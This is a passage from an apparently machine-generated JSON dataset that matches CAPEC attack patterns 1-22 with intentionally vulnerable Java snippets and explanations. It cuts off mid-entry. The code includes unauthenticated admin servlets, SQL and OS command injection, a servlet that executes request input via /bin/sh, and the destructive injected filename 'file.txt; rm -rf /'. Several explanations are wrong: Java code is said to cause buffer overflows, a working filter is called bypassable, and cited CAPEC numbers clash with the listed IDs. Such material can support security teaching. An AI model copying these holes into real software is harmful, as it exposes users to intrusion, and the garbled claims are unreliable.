[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/admin\")\npublic class AdminServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Missing authorization check\n        response.getWriter().println(\"Welcome to the admin panel!\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a servlet in a web application that is mapped to the '/admin' URL. The servlet handles GET requests but lacks proper authorization checks, allowing any user to access the admin panel. This embodies the main idea of the CAPEC 'Accessing Functionality Not Properly Constrained by ACLs' by showing how an attacker could access sensitive functionality due to missing access control. The related CWEs provide additional context, such as CWE-285 (Improper Authorization), which is directly relevant as the code does not perform any authorization checks before granting access to the admin panel."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AccountLockout {\n    private static final int MAX_ATTEMPTS = 3;\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private Map<String, Boolean> accountLocked = new HashMap<>();\n\n    public boolean login(String username, String password) {\n        if (accountLocked.getOrDefault(username, false)) {\n            System.out.println(\"Account is locked.\");\n            return false;\n        }\n\n        if (authenticate(username, password)) {\n            loginAttempts.put(username, 0); // Reset attempts on successful login\n            return true;\n        } else {\n            int attempts = loginAttempts.getOrDefault(username, 0) + 1;\n            loginAttempts.put(username, attempts);\n            if (attempts >= MAX_ATTEMPTS) {\n                accountLocked.put(username, true);\n                System.out.println(\"Account locked due to too many failed attempts.\");\n            }\n            return false;\n        }\n    }\n\n    private boolean authenticate(String username, String password) {\n        // Simulate authentication logic\n        return \"correct_password\".equals(password);\n    }\n\n    public static void main(String[] args) {\n        AccountLockout system = new AccountLockout();\n        String username = \"user1\";\n\n        // Simulate failed login attempts\n        system.login(username, \"wrong_password\");\n        system.login(username, \"wrong_password\");\n        system.login(username, \"wrong_password\");\n\n        // Attempt to login after account is locked\n        system.login(username, \"correct_password\");\n    }\n}",
        "description": "This Java code snippet demonstrates an overly restrictive account lockout mechanism, which is the main idea of the CAPEC 'Inducing Account Lockout'. The code defines a simple login system where an account is locked after three failed login attempts. The `login` method checks if the account is locked before attempting authentication. If the authentication fails, it increments the login attempt count and locks the account if the maximum number of attempts is reached. This mechanism can be exploited by an attacker to lock out legitimate users by repeatedly entering incorrect passwords, thus leveraging the security feature meant to prevent brute force attacks. The code also highlights related weaknesses such as overly restrictive account lockout (CWE-645) and improper restriction of excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import java.util.regex.Pattern;\n\npublic class InputFilterBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u200B\\u200C\\u200Dadmin\"; // Leading ghost characters (Zero Width Space, Zero Width Non-Joiner, Zero Width Joiner)\n        String filteredInput = filterInput(userInput);\n        if (isValidUser(filteredInput)) {\n            System.out.println(\"Access granted to user: \" + filteredInput);\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static String filterInput(String input) {\n        // Filter to remove leading ghost characters\n        return input.replaceAll(\"^[\\u200B\\u200C\\u200D]+\", \"\");\n    }\n\n    public static boolean isValidUser(String input) {\n        // Validate input against a list of allowed users\n        String[] allowedUsers = {\"admin\", \"user\", \"guest\"};\n        for (String user : allowedUsers) {\n            if (user.equals(input)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can bypass input filters by using leading 'ghost' characters (e.g., Zero Width Space, Zero Width Non-Joiner, Zero Width Joiner). The `filterInput` method attempts to remove these leading ghost characters, but if the filter is not comprehensive, the input may still pass through. The `isValidUser` method checks if the filtered input matches any allowed users. This example highlights the importance of proper input validation and filtering to prevent bypassing security mechanisms, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.regex.Pattern;\n\npublic class IPAddressValidator {\n    private static final Pattern IP_PATTERN = Pattern.compile(\n            \"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\");\n\n    public static boolean isValidIPAddress(String ip) {\n        return IP_PATTERN.matcher(ip).matches();\n    }\n\n    public static boolean isTrustedIP(String ip) {\n        if (!isValidIPAddress(ip)) {\n            return false;\n        }\n        try {\n            InetAddress inetAddress = InetAddress.getByName(ip);\n            String hostname = inetAddress.getHostName();\n            InetAddress[] addresses = InetAddress.getAllByName(hostname);\n            for (InetAddress addr : addresses) {\n                if (addr.getHostAddress().equals(ip)) {\n                    return true;\n                }\n            }\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        String ip = \"192.168.1.1\";\n        if (isTrustedIP(ip)) {\n            System.out.println(\"IP is trusted.\");\n        } else {\n            System.out.println(\"IP is not trusted.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic approach to validating and verifying an IP address to ensure it is trusted. The `isValidIPAddress` method uses a regex pattern to check if the IP address is in a standard dotted-decimal format. The `isTrustedIP` method performs a reverse DNS lookup to obtain the hostname associated with the IP address and then resolves the hostname back to an IP address to ensure they match. This approach addresses CWE-291 (Reliance on IP Address for Authentication) and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action). However, it is vulnerable to attacks described in CAPEC-273 (Using Alternative IP Address Encodings) because it does not account for alternative IP address encodings, such as octal or hexadecimal representations, which could be used to bypass the validation and trust checks."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class BlueBoxingExample {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 12345);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Simulate sending a supervisor signal tone\n            out.println(\"SUPERVISOR_SIGNAL\");\n\n            // Read response from the server\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n\n            // Close connections\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Blue Boxing attack. The code establishes a socket connection to a server and sends a 'SUPERVISOR_SIGNAL' tone, which is intended to mimic an administrative command. The server's response is then read and printed. This example highlights several vulnerabilities: improper authorization (CWE-285), improper restriction of communication channels (CWE-923), and improper verification of the source of a communication channel (CWE-940). The code does not verify the authenticity of the endpoint or the integrity of the message, making it susceptible to capture-replay attacks (CWE-294) and message tampering (CWE-924)."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import java.io.*;\n\npublic class ArgumentInjectionExample {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java ArgumentInjectionExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        try {\n            // CWE-78: OS Command Injection\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an example of Argument Injection vulnerability. The program takes a filename as a command-line argument and constructs an OS command to display the contents of the file using the 'cat' command. The filename is directly concatenated into the command string without any validation or neutralization of special characters. This can lead to an OS Command Injection (CWE-78) if an attacker provides a malicious filename containing special characters or command delimiters. For example, an attacker could provide a filename like 'file.txt; rm -rf /' to execute arbitrary commands. This snippet embodies the main idea of CAPEC-138 (Argument Injection) by showing how unvalidated and unfiltered arguments can change the behavior of the application."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\nimport java.util.Scanner;\n\npublic class BlindSQLInjectionExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter user ID: \");\n        String userId = scanner.nextLine();\n\n        try {\n            Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"username\", \"password\");\n            Statement statement = connection.createStatement();\n\n            // Vulnerable code: Improper Neutralization of Special Elements used in an SQL Command\n            String query = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\n            ResultSet resultSet = statement.executeQuery(query);\n\n            if (resultSet.next()) {\n                System.out.println(\"User found.\");\n            } else {\n                System.out.println(\"User not found.\");\n            }\n\n            connection.close();\n        } catch (Exception e) {\n            // Generation of Error Message Containing Sensitive Information\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Blind SQL Injection vulnerability. The code takes user input for a user ID and constructs an SQL query without proper input validation or neutralization of special elements. This allows an attacker to manipulate the SQL query by injecting malicious input. The code also prints stack traces, which can reveal sensitive information about the database and application environment. This example embodies the main idea of CAPEC-111 (Blind SQL Injection) and highlights related CWEs such as CWE-89 (SQL Injection), CWE-209 (Error Message Containing Sensitive Information), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import java.nio.ByteBuffer;\n\npublic class VulnerableLibrary {\n    public void vulnerableMethod(byte[] input) {\n        byte[] buffer = new byte[10]; // Fixed-size buffer\n        System.arraycopy(input, 0, buffer, 0, input.length); // No bounds checking\n    }\n\n    public static void main(String[] args) {\n        VulnerableLibrary lib = new VulnerableLibrary();\n        byte[] largeInput = new byte[20]; // Input larger than buffer\n        lib.vulnerableMethod(largeInput); // This will cause a buffer overflow\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability in an API call, which is the main idea of the CAPEC. The `vulnerableMethod` method in the `VulnerableLibrary` class copies an input byte array to a fixed-size buffer without checking if the input size exceeds the buffer size. This can lead to a buffer overflow, as shown when `vulnerableMethod` is called with an input larger than the buffer. This example embodies CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The code represents how an adversary could exploit a known vulnerable library, affecting all clients using this library."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class VulnerableUtility {\n    public static void main(String[] args) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        char[] buffer = new char[256];\n        try {\n            System.out.print(\"Enter command: \");\n            int charsRead = reader.read(buffer, 0, 512); // CWE-120: Buffer Copy without Checking Size of Input\n            String command = new String(buffer, 0, charsRead);\n            Runtime.getRuntime().exec(command); // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable command-line utility that reads user input and executes it as a system command. The code contains several vulnerabilities: \n1. CWE-120: Buffer Copy without Checking Size of Input - The `read` method attempts to read up to 512 characters into a buffer that is only 256 characters long, leading to a buffer overflow.\n2. CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component - The user input is directly passed to `Runtime.getRuntime().exec`, allowing for command injection.\n\nThe main idea of the CAPEC is represented by this code, as it shows how an adversary can exploit a buffer overflow in a command-line utility to potentially execute arbitrary commands, which could lead to privilege escalation."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import java.util.Map;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        // Get environment variable\n        String envVar = System.getenv(\"VULNERABLE_VAR\");\n        if (envVar == null) {\n            System.out.println(\"Environment variable not set.\");\n            return;\n        }\n\n        // Vulnerable buffer copy without checking size\n        char[] buffer = new char[50];\n        for (int i = 0; i < envVar.length(); i++) {\n            buffer[i] = envVar.charAt(i); // CWE-120: Buffer Copy without Checking Size of Input\n        }\n\n        // Print the buffer content\n        System.out.println(\"Buffer content: \" + new String(buffer));\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability via environment variables, as described in the CAPEC. The code retrieves an environment variable 'VULNERABLE_VAR' and copies its content into a fixed-size buffer without checking if the environment variable's length exceeds the buffer's capacity. This can lead to a buffer overflow (CWE-120). The code implicitly trusts the environment variable, which can be manipulated by an attacker to exploit this vulnerability. The code also touches on CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer) by potentially writing outside the buffer's intended boundary."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = getFileName(filePart);\n        String fileExtension = getFileExtension(fileName);\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (fileExtension.equals(\"jsp\")) {\n            // CWE-430: Deployment of Wrong Handler\n            // Incorrectly handling a JSP file as a static file\n            File uploads = new File(\"/uploads\");\n            File file = new File(uploads, fileName);\n            try (InputStream input = filePart.getInputStream()) {\n                Files.copy(input, file.toPath());\n            }\n            response.getWriter().println(\"File uploaded successfully.\");\n        } else {\n            response.getWriter().println(\"Invalid file type.\");\n        }\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n\n    private String getFileExtension(String fileName) {\n        if (fileName != null && fileName.contains(\".\")) {\n            return fileName.substring(fileName.lastIndexOf('.') + 1);\n        }\n        return \"\";\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where a web server misclassifies a file based on its extension. The code allows file uploads and relies on the file extension to determine how to handle the file. Specifically, if the file extension is 'jsp', it treats the file as a static file and saves it to the '/uploads' directory. This can lead to a dangerous situation where a JSP file, which should be processed by the server as a dynamic resource, is instead handled as a static file. This misclassification can be exploited by an attacker to execute arbitrary code on the server. The code embodies the main idea of CAPEC-430 by showing how reliance on file extensions (CWE-646) and improper handling (CWE-430) can lead to security vulnerabilities."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class MessageHandler {\n    private static final Map<String, String> messages = new HashMap<>();\n\n    static {\n        // Simulating a multicast message distribution\n        messages.put(\"client1\", \"Sensitive Data for Client 1\");\n        messages.put(\"client2\", \"Sensitive Data for Client 2\");\n    }\n\n    public static void main(String[] args) {\n        String clientId = \"client1\"; // This should be authenticated and validated\n        String message = getMessage(clientId);\n        System.out.println(\"Received message: \" + message);\n    }\n\n    public static String getMessage(String clientId) {\n        // No authentication or validation of clientId\n        return messages.get(clientId);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable message handling system that embodies the CAPEC 'Choosing Message Identifier' attack pattern. The code simulates a multicast message distribution where messages are stored in a HashMap and retrieved based on a client identifier. The main vulnerability lies in the `getMessage` method, which retrieves messages based on the clientId without any authentication or validation. This allows an attacker to potentially access sensitive information by guessing or determining valid client identifiers. The code also lacks mechanisms to ensure message integrity during transmission, making it susceptible to unauthorized access and manipulation."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import java.io.IOException;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws IOException {\n        // CWE-15: External Control of System or Configuration Setting\n        String configPath = System.getenv(\"CONFIG_PATH\");\n        if (configPath == null) {\n            configPath = \"/default/config/path\";\n        }\n        \n        // CWE-73: External Control of File Name or Path\n        java.nio.file.Path path = java.nio.file.Paths.get(configPath);\n        java.nio.file.Files.lines(path).forEach(System.out::println);\n        \n        // CWE-302: Authentication Bypass by Assumed-Immutable Data\n        String userRole = System.getenv(\"USER_ROLE\");\n        if (\"admin\".equals(userRole)) {\n            System.out.println(\"Access granted to admin functionality.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that embodies the main idea of CAPEC-13: Subverting Environment Variable Values. The code reads environment variables to control critical application behavior, such as configuration file paths and user roles. \n\n1. **CWE-15: External Control of System or Configuration Setting**: The application reads the 'CONFIG_PATH' environment variable to determine the configuration file path. An attacker can modify this environment variable to point to a malicious configuration file.\n\n2. **CWE-73: External Control of File Name or Path**: The application uses the value of 'CONFIG_PATH' to read and print the contents of the file. This can lead to unauthorized file access if the environment variable is manipulated.\n\n3. **CWE-302: Authentication Bypass by Assumed-Immutable Data**: The application checks the 'USER_ROLE' environment variable to grant or deny access to admin functionality. An attacker can set this variable to 'admin' to bypass authentication and gain unauthorized access.\n\nThe code represents the idea of subverting environment variable values to cause the target software to deviate from its expected operation, potentially leading to security vulnerabilities."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://malicious.example.com\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));\n            char[] buffer = new char[256];\n            int charsRead;\n            while ((charsRead = in.read(buffer)) != -1) {\n                // Vulnerable code: no bounds checking on buffer\n                String data = new String(buffer, 0, charsRead);\n                process(data);\n            }\n            in.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void process(String data) {\n        // Simulate processing of data\n        System.out.println(\"Processing: \" + data);\n    }\n}",
        "description": "This Java code snippet demonstrates a client-side application that reads data from a URL and processes it. The code is vulnerable to a buffer overflow attack because it does not perform proper bounds checking on the buffer used to read data from the URL. Specifically, the buffer is fixed at 256 characters, and the code does not verify if the incoming data exceeds this size, leading to potential buffer overflow. This vulnerability is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The code also lacks integrity checks (CWE-353) and proper input validation (CWE-20), making it susceptible to injection attacks (CWE-74)."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.print(\"Enter a filename: \");\n            String filename = reader.readLine();\n\n            // Vulnerable code: concatenating user input directly into the command\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n\n            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = processReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a command injection vulnerability. The program reads a filename from user input and directly concatenates it into a shell command (`cat <filename>`). This approach is vulnerable to command injection attacks because an attacker can input a filename containing shell command delimiters (e.g., `;`, `&&`) to execute arbitrary commands. For example, entering `file.txt; rm -rf /` would delete the root directory. This vulnerability is related to several CWEs, including CWE-77 (Command Injection), CWE-78 (OS Command Injection), and CWE-140 (Improper Neutralization of Delimiters). The code highlights the importance of properly sanitizing and validating user inputs to prevent such attacks."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class DictionaryAttackExample {\n    private static Map<String, String> users = new HashMap<>();\n\n    static {\n        // Weak password requirements (CWE-521)\n        users.put(\"user1\", \"password\");\n        users.put(\"user2\", \"123456\");\n    }\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Improper restriction of excessive authentication attempts (CWE-307)\n        return users.containsKey(username) && users.get(username).equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication system that is vulnerable to dictionary-based password attacks. The code initializes a user database with weak passwords (CWE-521) and does not implement any measures to restrict excessive authentication attempts (CWE-307). An attacker could easily use a dictionary of common passwords to gain access to user accounts. The code highlights the importance of strong password requirements and the need for mechanisms to prevent brute force attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class MaliciousFileExample {\n    public static void main(String[] args) {\n        String filePath = \"/var/www/uploads/\" + args[0];\n        try {\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            File file = new File(filePath);\n            if (!file.exists()) {\n                file.createNewFile();\n                file.setReadable(true, false); // Incorrectly setting permissions\n                file.setWritable(true, false); // Incorrectly setting permissions\n            }\n\n            // CWE-285: Improper Authorization\n            if (!isAuthorizedUser()) {\n                throw new SecurityException(\"User not authorized\");\n            }\n\n            // CWE-59: Improper Link Resolution Before File Access ('Link Following')\n            Path path = Paths.get(filePath);\n            if (Files.isSymbolicLink(path)) {\n                throw new IOException(\"Symbolic links are not allowed\");\n            }\n\n            // CWE-270: Privilege Context Switching Error\n            dropPrivileges();\n\n            // Execute the file (potentially malicious)\n            Runtime.getRuntime().exec(filePath);\n        } catch (IOException | SecurityException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isAuthorizedUser() {\n        // Dummy authorization check\n        return true;\n    }\n\n    private static void dropPrivileges() {\n        // Dummy method to represent dropping privileges\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a web server allows file uploads and then executes the uploaded file, which can be exploited by an attacker. The code includes several vulnerabilities: \n1. **CWE-732 (Incorrect Permission Assignment for Critical Resource)**: The file permissions are set incorrectly, allowing unintended actors to read or modify the file.\n2. **CWE-285 (Improper Authorization)**: The authorization check is superficial and can be bypassed easily.\n3. **CWE-59 (Improper Link Resolution Before File Access)**: The code does not properly handle symbolic links, which can be exploited to access unintended resources.\n4. **CWE-270 (Privilege Context Switching Error)**: The code does not properly manage privileges, potentially allowing an attacker to execute the file with elevated privileges.\n\nThe main idea of the CAPEC is to highlight the risks associated with allowing direct access to executable files, especially in environments like web servers where improper configuration can lead to severe security breaches."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + userInput + \"' />\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to 'XSS Targeting Non-Script Elements' (CAPEC-147). The servlet takes user input from a request parameter and directly embeds it into an <img> tag's src attribute without proper validation or sanitization. This can lead to Cross-Site Scripting (XSS) attacks if an attacker provides a malicious script as the input. The code snippet embodies CWE-80 (Basic XSS), CWE-82 (XSS in IMG tags), and CWE-79 (General XSS) by failing to neutralize special characters in user input, allowing an attacker to inject and execute scripts within the context of the web page."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String script = request.getParameter(\"script\");\n        if (script != null) {\n            try {\n                ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", script);\n                Process p = pb.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n            } catch (IOException e) {\n                response.getWriter().println(\"Error executing script\");\n            }\n        } else {\n            response.getWriter().println(\"No script provided\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where an attacker can embed and execute their own script within the server's execution context. The servlet takes a 'script' parameter from the HTTP request and executes it using a shell command. This represents the CAPEC 'Embedding Scripts within Scripts' and is related to several CWEs: CWE-284 (Improper Access Control) as it does not restrict who can execute scripts, CWE-79 (Cross-site Scripting) as it can potentially output untrusted data, CWE-830 (Inclusion of Web Functionality from an Untrusted Source) as it executes untrusted scripts, and CWE-506 (Embedded Malicious Code) as it allows execution of potentially malicious code."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class WeakEncryptionExample {\n    private static final String ALGORITHM = \"AES\";\n    private static final String HARD_CODED_KEY = \"1234567890123456\"; // CWE-321\n\n    public static void main(String[] args) throws Exception {\n        String plaintext = \"SensitiveData\";\n        String encryptedText = encrypt(plaintext, HARD_CODED_KEY);\n        System.out.println(\"Encrypted Text: \" + encryptedText);\n    }\n\n    public static String encrypt(String data, String key) throws Exception {\n        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedBytes = cipher.doFinal(data.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a weak encryption implementation that is vulnerable to brute force attacks. The code uses AES encryption with a hard-coded cryptographic key (CWE-321), which significantly increases the risk of the key being discovered through brute force methods. The encryption algorithm used (AES) is theoretically sound, but the use of a hard-coded key and potentially inadequate key length (CWE-326) makes the encryption strength insufficient for protecting sensitive data. This example embodies the main idea of CAPEC-116 (Encryption Brute Forcing) by illustrating how an attacker could potentially brute force the hard-coded key to decrypt the cipher text and obtain the plaintext."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n        Cookie[] cookies = request.getCookies();\n        String sessionId = null;\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"SESSIONID\")) {\n                    sessionId = cookie.getValue();\n                    break;\n                }\n            }\n        }\n\n        // CWE-384: Session Fixation\n        if (sessionId == null) {\n            sessionId = request.getParameter(\"sessionId\");\n            if (sessionId != null) {\n                Cookie newCookie = new Cookie(\"SESSIONID\", sessionId);\n                newCookie.setMaxAge(60 * 60); // 1 hour\n                response.addCookie(newCookie);\n            }\n        }\n\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        if (sessionId != null && sessionId.equals(\"trustedSessionId\")) {\n            response.getWriter().println(\"Welcome, authenticated user!\");\n        } else {\n            response.getWriter().println(\"Authentication failed.\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to the 'Exploitation of Trusted Identifiers' CAPEC. The code attempts to authenticate a user based on a session ID stored in a cookie or passed as a parameter. It embodies the following weaknesses:\n\n1. **CWE-539: Use of Persistent Cookies Containing Sensitive Information** - The session ID is stored in a persistent cookie, which can be easily accessed and exploited by an attacker.\n2. **CWE-384: Session Fixation** - The code does not invalidate an existing session ID when a new session is established, allowing an attacker to hijack a session.\n3. **CWE-602: Client-Side Enforcement of Server-Side Security** - The code relies on the client to provide a session ID and does not properly validate it on the server side, making it susceptible to spoofing attacks.\n\nOverall, this code snippet represents the main idea of the CAPEC by showing how an attacker can exploit trusted identifiers to perform unauthorized actions under the guise of an authenticated user."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new ClientHandler(socket).start();\n        }\n    }\n}\n\nclass ClientHandler extends Thread {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.startsWith(\"AUTH\")) {\n                String[] parts = clientMessage.split(\" \");\n                String username = parts[1];\n                String password = parts[2];\n\n                // Improper Authentication: No actual verification of credentials\n                if (username.equals(\"admin\")) {\n                    out.println(\"Welcome, \" + username);\n                } else {\n                    out.println(\"Invalid credentials\");\n                }\n            } else {\n                out.println(\"Please authenticate first\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    